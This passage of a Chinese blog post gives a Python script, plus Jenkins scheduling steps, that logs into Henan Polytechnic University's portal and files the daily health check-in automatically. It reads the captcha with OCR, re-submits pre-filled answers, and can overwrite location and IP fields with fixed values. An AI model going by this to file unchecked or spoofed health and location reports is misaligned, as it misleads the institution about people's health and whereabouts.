class=\"string\">&#x27;https://ehall.hpu.edu.cn/infoplus/interface/listNextStepsUsers&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;DOACTION&#x27;</span>: <span class=\"string\">&#x27;https://ehall.hpu.edu.cn/infoplus/interface/doAction&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;CHECK&#x27;</span>: <span class=\"string\">&#x27;https://ehall.hpu.edu.cn/taskcenter/api/me/processes/done?limit=1&amp;start=0&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;API&#x27;</span>: <span class=\"string\">&#x27;https://aip.baidubce.com/oauth/2.0/token?grant_type=client_credentials&amp;client_id=[ak]&amp;client_secret=[sk]&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;REQUEST_URL&#x27;</span>: <span class=\"string\">&#x27;https://aip.baidubce.com/rest/2.0/ocr/v1/general_basic&#x27;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 请求头，可以按需更改</span></span><br><span class=\"line\">HEADERS = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;User-Agent&#x27;</span>: <span class=\"string\">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) &#x27;</span></span><br><span class=\"line\">                  <span class=\"string\">&#x27;Chrome/78.0.3904.108 Safari/537.36 QIHU 360EE&#x27;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ReadConfig</span>:</span></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;读取配置文件类&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span>(<span class=\"params\">self, filename</span>):</span></span><br><span class=\"line\">        <span class=\"string\">&quot;&quot;&quot;配置文件读取初始化&quot;&quot;&quot;</span></span><br><span class=\"line\">        self.config = configparser.ConfigParser()</span><br><span class=\"line\">        self.config[<span class=\"string\">&#x27;Basic&#x27;</span>] = &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;CHANGE_DATA&#x27;</span>: <span class=\"literal\">True</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;CHANGE_ADDR&#x27;</span>: <span class=\"literal\">True</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;IP_ADDR&#x27;</span>: <span class=\"string\">&#x27;223.90.40.4&#x27;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        self.config.read(filename, encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_basic</span>(<span class=\"params\">self, param</span>):</span></span><br><span class=\"line\">        <span class=\"string\">&quot;&quot;&quot;获取Basic配置&quot;&quot;&quot;</span></span><br><span class=\"line\">        value = self.config.get(<span class=\"string\">&#x27;Basic&#x27;</span>, param)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> value</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_api</span>(<span class=\"params\">self, param</span>):</span></span><br><span class=\"line\">        <span class=\"string\">&quot;&quot;&quot;获取API配置&quot;&quot;&quot;</span></span><br><span class=\"line\">        value = self.config.get(<span class=\"string\">&#x27;API&#x27;</span>, param)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> value</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_user</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        <span class=\"string\">&quot;&quot;&quot;获取User配置&quot;&quot;&quot;</span></span><br><span class=\"line\">        value = self.config.items(<span class=\"string\">&#x27;User&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> value</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Bot</span>:</span></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;自动健康打卡类&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span>(<span class=\"params\">self, config_file</span>):</span></span><br><span class=\"line\">        <span class=\"string\">&quot;&quot;&quot;打卡初始化&quot;&quot;&quot;</span></span><br><span class=\"line\">        logging.basicConfig(level=logging.INFO, format=<span class=\"string\">&#x27;%(asctime)s - %(name)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class=\"line\">        self.logger = logging.getLogger(<span class=\"string\">&#x27;AutoReport&#x27;</span>)</span><br><span class=\"line\">        self.logger.info(<span class=\"string\">&#x27;程序启动中...&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 读取配置文件</span></span><br><span class=\"line\">        self.data = ReadConfig(config_file)</span><br><span class=\"line\">        self.chdata = self.data.get_basic(<span class=\"string\">&#x27;CHANGE_DATA&#x27;</span>)</span><br><span class=\"line\">        self.chaddr = self.data.get_basic(<span class=\"string\">&#x27;CHANGE_ADDR&#x27;</span>)</span><br><span class=\"line\">        self.ipaddr = self.data.get_basic(<span class=\"string\">&#x27;IP_ADDR&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        self.api_key = self.data.get_api(<span class=\"string\">&#x27;API_KEY&#x27;</span>)</span><br><span class=\"line\">        self.secret_key = self.data.get_api(<span class=\"string\">&#x27;SECRET_KEY&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 登录并打卡</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> user <span class=\"keyword\">in</span> self.data.get_user():</span><br><span class=\"line\">            self.sessions = requests.session()</span><br><span class=\"line\">            self.login(user)</span><br><span class=\"line\">            self.post()</span><br><span class=\"line\">            self.sessions.close()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">    @retry(stop_max_attempt_number=3)</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">login</span>(<span class=\"params\">self, user</span>):</span></span><br><span class=\"line\">        <span class=\"string\">&quot;&quot;&quot;登录&quot;&quot;&quot;</span></span><br><span class=\"line\">        self.logger.info(<span class=\"string\">&#x27;%s开始登录中...&#x27;</span>, user[<span class=\"number\">0</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 登录页面</span></span><br><span class=\"line\">        req = self.sessions.get(URL_MAP[<span class=\"string\">&#x27;HOST&#x27;</span>], headers=HEADERS)</span><br><span class=\"line\">        req = self.sessions.get(req.url, headers=HEADERS)</span><br><span class=\"line\">        soup = BeautifulSoup(req.content, features=<span class=\"string\">&quot;html.parser&quot;</span>)</span><br><span class=\"line\">        form = soup.find_all(<span class=\"string\">&#x27;input&#x27;</span>, class_=<span class=\"string\">&#x27;for-form&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 验证码获取</span></span><br><span class=\"line\">        captcha = URL_MAP[<span class=\"string\">&#x27;CAPTCHA&#x27;</span>] + str(int(round(time.time() * <span class=\"number\">1000</span>)))</span><br><span class=\"line\">        req = self.sessions.get(captcha, headers=HEADERS)</span><br><span class=\"line\">        img = ast.literal_eval(req.content.decode(<span class=\"string\">&#x27;utf-8&#x27;</span>))[<span class=\"string\">&#x27;img&#x27;</span>]</span><br><span class=\"line\">        self.logger.info(<span class=\"string\">&#x27;验证码获取成功!&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 验证码识别</span></span><br><span class=\"line\">        api = URL_MAP[<span class=\"string\">&#x27;API&#x27;</span>].replace(<span class=\"string\">&#x27;[ak]&#x27;</span>, self.api_key).replace(<span class=\"string\">&#x27;[sk]&#x27;</span>, self.secret_key)</span><br><span class=\"line\">        response = requests.get(api)</span><br><span class=\"line\">        access_token = response.json()[<span class=\"string\">&#x27;access_token&#x27;</span>]</span><br><span class=\"line\">        request_url = URL_MAP[<span class=\"string\">&#x27;REQUEST_URL&#x27;</span>] + <span class=\"string\">&quot;?access_token=&quot;</span> + access_token</span><br><span class=\"line\">        api_headers = &#123;<span class=\"string\">&#x27;content-type&#x27;</span>: <span class=\"string\">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;</span><br><span class=\"line\">        response = requests.post(request_url, data=&#123;<span class=\"string\">&#x27;image&#x27;</span>: img&#125;, headers=api_headers)</span><br><span class=\"line\">        captcha = response.json()[<span class=\"string\">&#x27;words_result&#x27;</span>][<span class=\"number\">0</span>][<span class=\"string\">&#x27;words&#x27;</span>]</span><br><span class=\"line\">        captcha = str(captcha.replace(<span class=\"string\">&#x27;=?&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>)).split(<span class=\"string\">&#x27;+&#x27;</span>)</span><br><span class=\"line\">        captcha = sum(map(int, captcha))</span><br><span class=\"line\">        self.logger.info(<span class=\"string\">&#x27;验证码识别成功!&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 构造表单</span></span><br><span class=\"line\">        token = ast.literal_eval(req.content.decode(<span class=\"string\">&#x27;utf-8&#x27;</span>))[<span class=\"string\">&#x27;token&#x27;</span>]</span><br><span class=\"line\">        account = ast.literal_eval(user[<span class=\"number\">1</span>])</span><br><span class=\"line\">        formdata = &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;username&#x27;</span>: account[<span class=\"number\">0</span>],</span><br><span class=\"line\">            <span class=\"string\">&#x27;password&#x27;</span>: account[<span class=\"number\">1</span>],</span><br><span class=\"line\">            <span class=\"string\">&#x27;_eventId&#x27;</span>: <span class=\"string\">&#x27;submit&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;token&#x27;</span>: token</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        formdata.update(&#123;f[<span class=\"string\">&#x27;name&#x27;</span>]: f[<span class=\"string\">&#x27;value&#x27;</span>] <span class=\"keyword\">for</span> f <span class=\"keyword\">in</span> form&#125;)</span><br><span class=\"line\">        formdata.update(&#123;<span class=\"string\">&#x27;captcha&#x27;</span>: captcha&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 登录</span></span><br><span class=\"line\">        req = self.sessions.post(URL_MAP[<span class=\"string\">&#x27;LOGIN&#x27;</span>], headers=HEADERS, data=formdata)</span><br><span class=\"line\">        soup = BeautifulSoup(req.content, features=<span class=\"string\">&#x27;html.parser&#x27;</span>)</span><br><span class=\"line\">        errormes = soup.find(<span class=\"string\">&#x27;span&#x27;</span>, id=<span class=\"string\">&#x27;errormes&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> errormes:</span><br><span class=\"line\">            self.logger.error(errormes[<span class=\"string\">&#x27;value&#x27;</span>])</span><br><span class=\"line\">            <span class=\"keyword\">raise</span> Exception(errormes[<span class=\"string\">&#x27;value&#x27;</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 检测登录状态</span></span><br><span class=\"line\">        url = self.sessions.get(URL_MAP[<span class=\"string\">&#x27;HOST&#x27;</span>], headers=HEADERS).url</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> url == URL_MAP[<span class=\"string\">&#x27;HOST&#x27;</span>]:</span><br><span class=\"line\">            self.logger.error(<span class=\"string\">&#x27;登录失败, 未知错误!&#x27;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">raise</span> Exception(<span class=\"string\">&#x27;登录失败, 未知错误!&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            self.logger.info(<span class=\"string\">&#x27;使用账号密码登录成功!&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">    @retry(stop_max_attempt_number=3)</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">post</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        <span class=\"string\">&quot;&quot;&quot;打卡&quot;&quot;&quot;</span></span><br><span class=\"line\">        self.logger.info(<span class=\"string\">&#x27;打卡进行中...&#x27;</span>)</span><br><span class=\"line\">        req = self.sessions.get(URL_MAP[<span class=\"string\">&#x27;HOST&#x27;</span>], headers=HEADERS)</span><br><span class=\"line\">        soup = BeautifulSoup(req.content, features=<span class=\"string\">&#x27;html.parser&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 构造表单</span></span><br><span class=\"line\">        csrf = soup.find(<span class=\"string\">&#x27;meta&#x27;</span>, itemscope=<span class=\"string\">&#x27;csrfToken&#x27;</span>)[<span class=\"string\">&#x27;content&#x27;</span>]</span><br><span class=\"line\">        formdata = &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;idc&#x27;</span>: <span class=\"string\">&#x27;XSMRJKSB&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;release&#x27;</span>: <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;csrfToken&#x27;</span>: csrf,</span><br><span class=\"line\">            <span class=\"string\">&#x27;formData&#x27;</span>: <span class=\"string\">&#x27;&#123;&quot;_VAR_URL&quot;:&quot;https://ehall.hpu.edu.cn/infoplus/form/XSMRJKSB/start&quot;,&quot;_VAR_URL_Attr&quot;:&quot;&#123;&#125;&quot;&#125;&#x27;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        req = self.sessions.post(URL_MAP[<span class=\"string\">&#x27;START&#x27;</span>], headers=HEADERS, data=formdata)</span><br><span class=\"line\">        url = req.json()[<span class=\"string\">&#x27;entities&#x27;</span>][<span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 构造表单</span></span><br><span class=\"line\">        stepid = int(re.findall(<span class=\"string\">r&#x27;\\d+&#x27;</span>, url)[<span class=\"number\">0</span>])</span><br><span class=\"line\">        self.logger.info(<span class=\"string\">&#x27;开始流程%s中...&#x27;</span>, stepid)</span><br><span class=\"line\">        formdata = &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;stepId&#x27;</span>: stepid,</span><br><span class=\"line\">            <span class=\"string\">&#x27;instanceId&#x27;</span>: <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;admin&#x27;</span>: <span class=\"string\">&#x27;false&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;rand&#x27;</span>: random.random() * <span class=\"number\">999</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;width&#x27;</span>: <span class=\"string\">&#x27;1747&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;lang&#x27;</span>: <span class=\"string\">&#x27;zh&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;csrfToken&#x27;</span>: csrf</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        HEADERS.update(&#123;<span class=\"string\">&#x27;Referer&#x27;</span>: url&#125;)</span><br><span class=\"line\">        req = self.sessions.post(URL_MAP[<span class=\"string\">&#x27;RENDER&#x27;</span>], headers=HEADERS, data=formdata)</span><br><span class=\"line\">        self.logger.info(<span class=\"string\">&#x27;已加载审批表!&#x27;</span>)</span><br><span class=\"line\">        form = req.json()[<span class=\"string\">&#x27;entities&#x27;</span>][<span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 构造表单</span></span><br><span class=\"line\">        instanceid = form[<span class=\"string\">&#x27;step&#x27;</span>][<span class=\"string\">&#x27;instanceId&#x27;</span>]</span><br><span class=\"line\">        formdata = &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;stepId&#x27;</span>: stepid,</span><br><span class=\"line\">            <span class=\"string\">&#x27;includingTop&#x27;</span>: <span class=\"string\">&#x27;true&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;csrfToken&#x27;</span>: csrf,</span><br><span class=\"line\">            <span class=\"string\">&#x27;lang&#x27;</span>: <span class=\"string\">&#x27;zh&#x27;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        req = self.sessions.post(URL_MAP[<span class=\"string\">&#x27;PROCESS&#x27;</span>].replace(<span class=\"string\">&#x27;[id]&#x27;</span>, instanceid), headers=HEADERS, data=formdata)</span><br><span class=\"line\">        self.logger.info(<span class=\"string\">&#x27;审批表处理中...&#x27;</span>)</span><br><span class=\"line\">        timestamp = req.json()[<span class=\"string\">&#x27;entities&#x27;</span>][<span class=\"number\">0</span>][<span class=\"string\">&#x27;remarks&#x27;</span>][<span class=\"number\">0</span>][<span class=\"string\">&#x27;assignTime&#x27;</span>]</span><br><span class=\"line\">        boundfields = <span class=\"string\">&#x27;,&#x27;</span>.join(list(form[<span class=\"string\">&#x27;data&#x27;</span>].keys()))</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 构造表单</span></span><br><span class=\"line\">        postdata = form[<span class=\"string\">&#x27;data&#x27;</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> self.chdata:</span><br><span class=\"line\">            fixdata = &#123;</span><br><span class=\"line\">                <span class=\"string\">&#x27;fieldTXcs&#x27;</span>: <span class=\"string\">&#x27;410800&#x27;</span>,</span><br><span class=\"line\">                <span class=\"string\">&#x27;fieldTXcs_Name&#x27;</span>: <span class=\"string\">&#x27;焦作市&#x27;</span>,</span><br><span class=\"line\">                <span class=\"string\">&#x27;fieldTXdq&#x27;</span>: <span class=\"string\">&#x27;410811&#x27;</span>,</span><br><span class=\"line\">                <span class=\"string\">&#x27;fieldTXdq_Name&#x27;</span>: <span class=\"string\">&#x27;山阳区&#x27;</span>,</span><br><span class=\"line\">                <span class=\"string\">&#x27;fieldTXjtwz&#x27;</span>: <span class=\"string\">&#x27;河南理工大学&#x27;</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            postdata.update(fixdata)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> self.chaddr:</span><br><span class=\"line\">            postdata.update(&#123;<span class=\"string\">&#x27;_VAR_ADDR&#x27;</span>: self.ipaddr&#125;)</span><br><span class=\"line\">        formdata = &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;stepId&#x27;</span>: stepid,</span><br><span class=\"line\">            <span class=\"string\">&#x27;actionId&#x27;</span>: <span class=\"number\">1</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;formData&#x27;</span>: str(postdata),</span><br><span class=\"line\">            <span class=\"string\">&#x27;timestamp&#x27;</span>: timestamp,</span><br><span class=\"line\">            <span class=\"string\">&#x27;rand&#x27;</span>: random.random() * <span class=\"number\">999</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;boundFields&#x27;</span>: boundfields,</span><br><span class=\"line\">            <span class=\"string\">&#x27;csrfToken&#x27;</span>: csrf,</span><br><span class=\"line\">            <span class=\"string\">&#x27;lang&#x27;</span>: <span class=\"string\">&#x27;zh&#x27;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        req = self.sessions.post(URL_MAP[<span class=\"string\">&#x27;NEXTSTEP&#x27;</span>], headers=HEADERS, data=formdata)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> req.json()[<span class=\"string\">&#x27;ecode&#x27;</span>] == <span class=\"string\">&#x27;SUCCEED&#x27;</span>:</span><br><span class=\"line\">            self.logger.info(<span class=\"string\">&#x27;健康打卡准备阶段, 成功!&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">raise</span> Exception(<span class=\"string\">&#x27;健康打卡准备阶段, 失败!&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 构造表单</span></span><br><span class=\"line\">        formdata = &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;actionId&#x27;</span>: <span class=\"number\">1</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;formData&#x27;</span>: str(form[<span class=\"string\">&#x27;data&#x27;</span>]),</span><br><span class=\"line\">            <span class=\"string\">&#x27;remark&#x27;</span>: <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;rand&#x27;</span>: random.random() * <span class=\"number\">999</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;nextUsers&#x27;</span>: <span class=\"string\">&#x27;&#123;&#125;&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;stepId&#x27;</span>: stepid,</span><br><span class=\"line\">            <span class=\"string\">&#x27;timestamp&#x27;</span>: timestamp,</span><br><span class=\"line\">            <span class=\"string\">&#x27;boundFields&#x27;</span>: boundfields,</span><br><span class=\"line\">            <span class=\"string\">&#x27;csrfToken&#x27;</span>: csrf,</span><br><span class=\"line\">            <span class=\"string\">&#x27;lang&#x27;</span>: <span class=\"string\">&#x27;zh&#x27;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        req = self.sessions.post(URL_MAP[<span class=\"string\">&#x27;DOACTION&#x27;</span>], headers=HEADERS, data=formdata)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> req.json()[<span class=\"string\">&#x27;ecode&#x27;</span>] == <span class=\"string\">&#x27;SUCCEED&#x27;</span>:</span><br><span class=\"line\">            self.logger.info(<span class=\"string\">&#x27;健康打卡填报阶段, 成功!&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">raise</span> Exception(<span class=\"string\">&#x27;健康打卡填报阶段, 失败!&#x27;</span>)</span><br><span class=\"line\">        self.check()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">    @retry(stop_max_attempt_number=3)</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">check</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        <span class=\"string\">&quot;&quot;&quot;打卡完毕后复检&quot;&quot;&quot;</span></span><br><span class=\"line\">        req = self.sessions.get(URL_MAP[<span class=\"string\">&#x27;CHECK&#x27;</span>], headers=HEADERS)</span><br><span class=\"line\">        last_time = req.json()[<span class=\"string\">&#x27;entities&#x27;</span>][<span class=\"number\">0</span>][<span class=\"string\">&#x27;update&#x27;</span>]</span><br><span class=\"line\">        local_time = time.strftime(<span class=\"string\">&quot;%Y/%m/%d %H:%M:%S&quot;</span>, time.localtime(last_time))</span><br><span class=\"line\">        update = round(time.time()) - last_time</span><br><span class=\"line\">        <span class=\"keyword\">if</span> update &gt; <span class=\"number\">5</span>:</span><br><span class=\"line\">            self.logger.error(<span class=\"string\">&#x27;上次打卡完成于%ss前,打卡可能未成功!&#x27;</span>, update)</span><br><span class=\"line\">            <span class=\"keyword\">raise</span> Exception(<span class=\"string\">&#x27;打卡复检状态异常!&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            self.logger.info(<span class=\"string\">&#x27;打卡完成于%s&#x27;</span>, local_time)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    BOT = Bot(<span class=\"string\">&#x27;config.ini&#x27;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h1 id=\"Coding\"><a href=\"#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h1><h2 id=\"创建项目\"><a href=\"#创建项目\" class=\"headerlink\" title=\"创建项目\"></a>创建项目</h2><p>登录<a href=\"https://e.coding.net/login\">Coding</a>， 进入团队，切换到项目（左边栏点击’项目’），创建项目，选择DevOps项目。</p>\n<h2 id=\"创建代码仓库\"><a href=\"#创建代码仓库\" class=\"headerlink\" title=\"创建代码仓库\"></a>创建代码仓库</h2><p>切换到代码仓库，新建代码仓库，勾选启用READEME.md文件初始化项目，取消启用代码扫描，点击确认。<br><img data-src=\"https://cdn.file.todest.cn/blog/pic/20201205164547.png\" alt=\"\"></p>\n<h2 id=\"上传文件\"><a href=\"#上传文件\" class=\"headerlink\" title=\"上传文件\"></a>上传文件</h2><p>新建文件main.py，将完整代码粘贴进去，点击提交并直接确认。<br><img data-src=\"https://cdn.file.todest.cn/blog/pic/20201205164816.png\" alt=\"\"><br>点击上方浏览返回文件根目录，再次创建文件Jenkinsfile (注: 无文件名后缀，请不要自行发挥)，粘贴下面代码并提交，并重复此步骤将修改好的config.ini上传。<br><figure class=\"highlight yml\"><figcaption><span>Jenkinsfile</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">pipeline</span> &#123;</span><br><span class=\"line\">  <span class=\"string\">agent</span> &#123;</span><br><span class=\"line\">    <span class=\"string\">any</span> &#123;</span><br><span class=\"line\">      <span class=\"string\">reuseNode</span> <span class=\"literal\">true</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"string\">stages</span> &#123;</span><br><span class=\"line\">    <span class=\"string\">stage(&#x27;检出&#x27;)</span> &#123;</span><br><span class=\"line\">      <span class=\"string\">steps</span> &#123;</span><br><span class=\"line\">        <span class=\"string\">checkout(</span>[</span><br><span class=\"line\">          <span class=\"string\">$class:</span> <span class=\"string\">&#x27;GitSCM&#x27;</span>,</span><br><span class=\"line\">          <span class=\"attr\">branches:</span> [[<span class=\"attr\">name:</span> <span class=\"string\">env.GIT_BUILD_REF</span>]],</span><br><span class=\"line\">          <span class=\"attr\">userRemoteConfigs:</span> [[</span><br><span class=\"line\">            <span class=\"attr\">url:</span> <span class=\"string\">env.GIT_REPO_URL</span>,</span><br><span class=\"line\">            <span class=\"attr\">credentialsId:</span> <span class=\"string\">env.CREDENTIALS_ID</span></span><br><span class=\"line\">          ]]]<span class=\"string\">)</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"string\">stage(&#x27;安装依赖&#x27;)</span> &#123;</span><br><span class=\"line\">        <span class=\"string\">steps</span> &#123;</span><br><span class=\"line\">          <span class=\"string\">sh</span> <span class=\"string\">&#x27;&#x27;</span><span class=\"string\">&#x27;pip3 install --upgrade pip</span></span><br><span class=\"line\"><span class=\"string\">pip3 install setuptools</span></span><br><span class=\"line\"><span class=\"string\">pip3 install requests</span></span><br><span class=\"line\"><span class=\"string\">pip3 install bs4</span></span><br><span class=\"line\"><span class=\"string\">pip3 install configparser</span></span><br><span class=\"line\"><span class=\"string\">pip3 install retrying&#x27;</span><span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"string\">stage(&#x27;运行&#x27;)</span> &#123;</span><br><span class=\"line\">        <span class=\"string\">steps</span> &#123;</span><br><span class=\"line\">          <span class=\"string\">sh</span> <span class=\"string\">&#x27;python3 main.py&#x27;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"创建构建计划\"><a href=\"#创建构建计划\" class=\"headerlink\" title=\"创建构建计划\"></a>创建构建计划</h2><p>切换到持续集成-&gt;构建计划，创建构建计划，翻到最下面选择自定义构建过程，代码仓库选择此代码仓库，配置来源勾选上使用代码库中的Jenkinsfile，点击确认。<br><img data-src=\"https://cdn.file.todest.cn/blog/pic/20201205165857.png\" alt=\"\"><br>保存并构建，确认，立即构建，等待构建成功。<br><img data-src=\"https://cdn.file.todest.cn/blog/pic/20201205170328.png\" alt=\"\"></p>\n<h2 id=\"设置定时触发\"><a href=\"#设置定时触发\" class=\"headerlink\" title=\"设置定时触发\"></a>设置定时触发</h2><p>点击右上角的设置修改构建计划的配置，切换到触发规则，添加定时触发，设置好触发的时期时间点击确认。<br><img data-src=\"https://cdn.file.todest.cn/blog/pic/20201205170919.png\" alt=\"\"></p>\n<h2 id=\"完成并查看\"><a href=\"#完成并查看\" class=\"headerlink\" title=\"完成并查看\"></a>完成并查看</h2><p>如果到了这里还没有出现错误的话，那么就基本没问题了，可以在项目概览查看每次定时触发情况。<br><img data-src=\"https://cdn.file.todest.cn/blog/pic/20201205171438.png\" alt=\"\"><br>也可以点击任务ID查看执行日志。<br><img 